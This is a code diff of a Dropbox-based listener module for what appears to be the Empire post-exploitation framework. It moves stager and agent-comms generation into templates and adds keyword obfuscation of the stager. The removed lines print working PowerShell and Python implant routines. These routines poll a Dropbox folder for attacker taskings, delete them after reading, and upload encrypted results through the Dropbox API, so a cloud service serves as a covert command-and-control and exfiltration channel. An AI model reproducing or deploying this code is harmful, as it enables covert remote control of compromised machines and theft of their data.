@@ -402,38 +402,46 @@ class Listener(object):
         pollInterval = listenerOptions["PollInterval"]["Value"]
         stagingKey = listenerOptions["StagingKey"]["Value"]
         baseFolder = listenerOptions["BaseFolder"]["Value"].strip("/")
-        apiToken = listenerOptions["APIToken"]["Value"]
+        api_token = listenerOptions["APIToken"]["Value"]
         profile = listenerOptions["DefaultProfile"]["Value"]
         workingHours = listenerOptions["WorkingHours"]["Value"]
         stagingFolder = "/%s/%s" % (
             baseFolder,
             listenerOptions["StagingFolder"]["Value"].strip("/"),
         )
+        taskingsFolder = "/%s/%s" % (
+            baseFolder,
+            listenerOptions["TaskingsFolder"]["Value"].strip("/"),
+        )
+        resultsFolder = "/%s/%s" % (
+            baseFolder,
+            listenerOptions["ResultsFolder"]["Value"].strip("/"),
+        )
 
         if language.lower() == "powershell":
+            template_path = [
+                os.path.join(self.mainMenu.installPath, "/data/agent/stagers"),
+                os.path.join(self.mainMenu.installPath, "./data/agent/stagers"),
+            ]
 
-            # read in the stager base
-            with open(
-                "%s/data/agent/stagers/dropbox.ps1" % (self.mainMenu.installPath)
-            ) as f:
-                stager = f.read()
+            eng = templating.TemplateEngine(template_path)
+            template = eng.get_template("dropbox/dropbox.ps1")
 
-            # patch the server and key information
-            stager = stager.replace("REPLACE_STAGING_FOLDER", stagingFolder)
-            stager = stager.replace("REPLACE_STAGING_KEY", stagingKey)
-            stager = stager.replace("REPLACE_POLLING_INTERVAL", pollInterval)
+            template_options = {
+                "api_token": api_token,
+                "tasking_folder": taskingsFolder,
+                "results_folder": resultsFolder,
+                "staging_folder": stagingFolder,
+                "poll_interval": pollInterval,
+                "working_hours": workingHours,
+                "staging_key": stagingKey,
+            }
 
-            # patch in working hours, if any
-            if workingHours != "":
-                stager = stager.replace("WORKING_HOURS_REPLACE", workingHours)
+            stager = template.render(template_options)
 
-            unobfuscated_stager = ""
-
-            for line in stager.split("\n"):
-                line = line.strip()
-                # skip commented line
-                if not line.startswith("#"):
-                    unobfuscated_stager += line
+            # Get the random function name generated at install and patch the stager with the proper function name
+            stager = data_util.keyword_obfuscation(stager)
+            unobfuscated_stager = listener_util.remove_lines_comments(stager)
 
             # base64 encode the stager and return it
             if encode:
@@ -454,14 +462,17 @@ class Listener(object):
                 os.path.join(self.mainMenu.installPath, "./data/agent/stagers"),
             ]
             eng = templating.TemplateEngine(template_path)
-            template = eng.get_template("dropbox.py")
+            template = eng.get_template("dropbox/dropbox.py")
 
             template_options = {
+                "api_token": api_token,
+                "tasking_folder": taskingsFolder,
+                "results_folder": resultsFolder,
                 "staging_folder": stagingFolder,
                 "poll_interval": pollInterval,
+                "working_hours": workingHours,
                 "staging_key": stagingKey,
                 "profile": profile,
-                "api_token": apiToken,
             }
 
             stager = template.render(template_options)
@@ -518,12 +529,6 @@ class Listener(object):
             with open(self.mainMenu.installPath + "/data/agent/agent.ps1") as f:
                 code = f.read()
 
-            # patch in the comms methods
-            commsCode = self.generate_comms(
-                listenerOptions=listenerOptions, language=language
-            )
-            code = code.replace("REPLACE_COMMS", commsCode)
-
             # strip out comments and blank lines
             code = helpers.strip_powershell_comments(code)
 
@@ -554,12 +559,6 @@ class Listener(object):
                 f = open(self.mainMenu.installPath + "/data/agent/agent.py")
             code = f.read()
             f.close()
-
-            # path in the comms methods
-            commsCode = self.generate_comms(
-                listenerOptions=listenerOptions, language=language
-            )
-            code = code.replace("REPLACE_COMMS", commsCode)
 
             # strip out comments and blank lines
             code = helpers.strip_python_comments(code)
@@ -600,11 +599,16 @@ class Listener(object):
 
         This is so agents can easily be dynamically updated for the new listener.
         """
-
+        baseFolder = listenerOptions["BaseFolder"]["Value"].strip("/")
         stagingKey = listenerOptions["StagingKey"]["Value"]
         pollInterval = listenerOptions["PollInterval"]["Value"]
-        apiToken = listenerOptions["APIToken"]["Value"]
-        baseFolder = listenerOptions["BaseFolder"]["Value"].strip("/")
+        api_token = listenerOptions["API_TOKEN"]["Value"]
+        profile = listenerOptions["DefaultProfile"]["Value"]
+
+        stagingFolder = "/%s/%s" % (
+            baseFolder,
+            listenerOptions["StagingFolder"]["Value"].strip("/"),
+        )
         taskingsFolder = "/%s/%s" % (
             baseFolder,
             listenerOptions["TaskingsFolder"]["Value"].strip("/"),
@@ -616,200 +620,46 @@ class Listener(object):
 
         if language:
             if language.lower() == "powershell":
+                template_path = [
+                    os.path.join(self.mainMenu.installPath, "/data/agent/stagers"),
+                    os.path.join(self.mainMenu.installPath, "./data/agent/stagers"),
+                ]
 
-                updateServers = f'$Script:APIToken = "{apiToken}";'
+                eng = templating.TemplateEngine(template_path)
+                template = eng.get_template("dropbox/comms.ps1")
 
-                getTask = f"""
-    $script:GetTask = {{
-        try {{
-            # build the web request object
-            $wc= New-Object System.Net.WebClient
+                template_options = {
+                    "api_token": api_token,
+                    "tasking_folder": taskingsFolder,
+                    "results_folder": resultsFolder,
+                }
 
-            # set the proxy settings for the WC to be the default system settings
-            $wc.Proxy = [System.Net.WebRequest]::GetSystemWebProxy();
-            $wc.Proxy.Credentials = [System.Net.CredentialCache]::DefaultCredentials;
-            if($Script:Proxy) {{
-                $wc.Proxy = $Script:Proxy;
-            }}
-
-            $wc.Headers.Add("User-Agent", $script:UserAgent)
-            $Script:Headers.GetEnumerator() | ForEach-Object {{$wc.Headers.Add($_.Name, $_.Value)}}
-
-            $TaskingsFolder = '{taskingsFolder}'
-            $wc.Headers.Set("Authorization", "Bearer $($Script:APIToken)")
-            $wc.Headers.Set("Dropbox-API-Arg", "{{`"path`":`"$TaskingsFolder/$($script:SessionID).txt`"}}")
-            $Data = $wc.DownloadData("https://content.dropboxapi.com/2/files/download")
-
-            if($Data -and ($Data.Length -ne 0)) {{
-                # if there was a tasking data, remove it
-                $wc.Headers.Add("Content-Type", " application/json")
-                $wc.Headers.Remove("Dropbox-API-Arg")
-                $Null=$wc.UploadString("https://api.dropboxapi.com/2/files/delete", "POST", "{{`"path`":`"$TaskingsFolder/$($script:SessionID).txt`"}}")
-                $Data
-            }}
-            $script:MissedCheckins = 0
-        }}
-        catch {{
-            if ($_ -match 'Unable to connect') {{
-                $script:MissedCheckins += 1
-            }}
-        }}
-    }}
-                """
-
-                sendMessage = f"""
-    $script:SendMessage = {{
-        param($Packets)
-
-        if($Packets) {{
-            # build and encrypt the response packet
-            $EncBytes = Encrypt-Bytes $Packets
-
-            # build the top level RC4 "routing packet"
-            # meta 'RESULT_POST' : 5
-            $RoutingPacket = New-RoutingPacket -EncData $EncBytes -Meta 5
-
-            # build the web request object
-            $wc = New-Object System.Net.WebClient
-            # set the proxy settings for the WC to be the default system settings
-            $wc.Proxy = [System.Net.WebRequest]::GetSystemWebProxy();
-            $wc.Proxy.Credentials = [System.Net.CredentialCache]::DefaultCredentials;
-            if($Script:Proxy) {{
-                $wc.Proxy = $Script:Proxy;
-            }}
-
-            $wc.Headers.Add('User-Agent', $Script:UserAgent)
-            $Script:Headers.GetEnumerator() | ForEach-Object {{$wc.Headers.Add($_.Name, $_.Value)}}
-
-            $ResultsFolder = '{resultsFolder}'
-
-            try {{
-                # check if the results file is still in the specified location, if so then
-                #   download the file and append the new routing packet to it
-                try {{
-                    $Data = $Null
-                    $wc.Headers.Set("Authorization", "Bearer $($Script:APIToken)");
-                    $wc.Headers.Set("Dropbox-API-Arg", "{{`"path`":`"$ResultsFolder/$($script:SessionID).txt`"}}");
-                    $Data = $wc.DownloadData("https://content.dropboxapi.com/2/files/download")
-                }}
-                catch {{ }}
-
-                if($Data -and $Data.Length -ne 0) {{
-                    $RoutingPacket = $Data + $RoutingPacket
-                }}
-
-                $wc2 = New-Object System.Net.WebClient
-                $wc2.Proxy = [System.Net.WebRequest]::GetSystemWebProxy();
-                $wc2.Proxy.Credentials = [System.Net.CredentialCache]::DefaultCredentials;
-                if($Script:Proxy) {{
-                    $wc2.Proxy = $Script:Proxy;
-                }}
-
-                $wc2.Headers.Add("Authorization", "Bearer $($Script:APIToken)")
-                $wc2.Headers.Add("Content-Type", "application/octet-stream")
-                $wc2.Headers.Add("Dropbox-API-Arg", "{{`"path`":`"$ResultsFolder/$($script:SessionID).txt`"}}");
-                $Null = $wc2.UploadData("https://content.dropboxapi.com/2/files/upload", "POST", $RoutingPacket)
-                $script:MissedCheckins = 0
-            }}
-            catch {{
-                if ($_ -match 'Unable to connect') {{
-                    $script:MissedCheckins += 1
-                }}
-            }}
-        }}
-    }}
-                """
-
-                return updateServers + getTask + sendMessage
+                comms = template.render(template_options)
+                return comms
 
             elif language.lower() == "python":
+                template_path = [
+                    os.path.join(self.mainMenu.installPath, "/data/agent/stagers"),
+                    os.path.join(self.mainMenu.installPath, "./data/agent/stagers"),
+                ]
+                eng = templating.TemplateEngine(template_path)
+                template = eng.get_template("dropbox/comms.py")
 
-                sendMessage = """
-def send_message(packets=None):
-    # Requests a tasking or posts data to a randomized tasking URI.
-    # If packets == None, the agent GETs a tasking from the control server.
-    # If packets != None, the agent encrypts the passed packets and
-    #    POSTs the data to the control server.
+                template_options = {
+                    "api_token": api_token,
+                    "taskings_folder": taskingsFolder,
+                    "results_folder": resultsFolder,
+                }
 
-    def post_message(uri, data, headers):
-        req = urllib.request.urlopen(uri)
-        headers['Authorization'] = "Bearer REPLACE_API_TOKEN"
-        for key, value in headers.items():
-            req.add_header("%s"%(key),"%s"%(value))
+                comms = template.render(template_options)
+                return comms
 
-        if data:
-            req.add_data(data)
-
-        o=urllib.request.build_opener()
-        o.add_handler(urllib.request.ProxyHandler(urllib.request.getproxies()))
-        urllib.request.install_opener(o)
-
-        return urllib.request.urlopen(req).read()
-
-    global missedCheckins
-    global headers
-    taskingsFolder="REPLACE_TASKSING_FOLDER"
-    resultsFolder="REPLACE_RESULTS_FOLDER"
-    data = None
-    requestUri=''
-    try:
-        del headers['Content-Type']
-    except:
-        pass
-
-
-    if packets:
-        # aes_encrypt_then_hmac is in stager.py
-        encData = aes_encrypt_then_hmac(key, packets)
-        data = build_routing_packet(stagingKey, sessionID, meta=5, encData=encData)
-        #check to see if there are any results already present
-
-        headers['Dropbox-API-Arg'] = "{\\"path\\":\\"%s/%s.txt\\"}" % (resultsFolder, sessionID)
-
-        try:
-            pkdata = post_message('https://content.dropboxapi.com/2/files/download', data=None, headers=headers)
-        except:
-            pkdata = None
-
-        if pkdata and len(pkdata) > 0:
-            data = pkdata + data
-
-        headers['Content-Type'] = "application/octet-stream"
-        requestUri = 'https://content.dropboxapi.com/2/files/upload'
-    else:
-        headers['Dropbox-API-Arg'] = "{\\"path\\":\\"%s/%s.txt\\"}" % (taskingsFolder, sessionID)
-        requestUri='https://content.dropboxapi.com/2/files/download'
-
-    try:
-        resultdata = post_message(requestUri, data, headers)
-        if (resultdata and len(resultdata) > 0) and requestUri.endswith('download'):
-            headers['Content-Type'] = "application/json"
-            del headers['Dropbox-API-Arg']
-            datastring="{\\"path\\":\\"%s/%s.txt\\"}" % (taskingsFolder, sessionID)
-            nothing = post_message('https://api.dropboxapi.com/2/files/delete', datastring, headers)
-
-        return ('200', resultdata)
-
-    except urllib.request.HTTPError as HTTPError:
-        # if the server is reached, but returns an erro (like 404)
-        return (HTTPError.code, '')
-
-    except urllib.request.URLError as URLerror:
-        # if the server cannot be reached
-        missedCheckins = missedCheckins + 1
-        return (URLerror.reason, '')
-
-    return ('', '')
-"""
-
-                sendMessage = sendMessage.replace(
-                    "REPLACE_TASKSING_FOLDER", taskingsFolder
+            else:
+                print(
+                    helpers.color(
+                        "[!] listeners/dbx generate_comms(): invalid language specification, only 'powershell' and 'python' are currently supported for this module."
+                    )
                 )
-                sendMessage = sendMessage.replace(
-                    "REPLACE_RESULTS_FOLDER", resultsFolder
-                )
-                sendMessage = sendMessage.replace("REPLACE_API_TOKEN", apiToken)
-                return sendMessage
         else:
             print(
                 helpers.color(
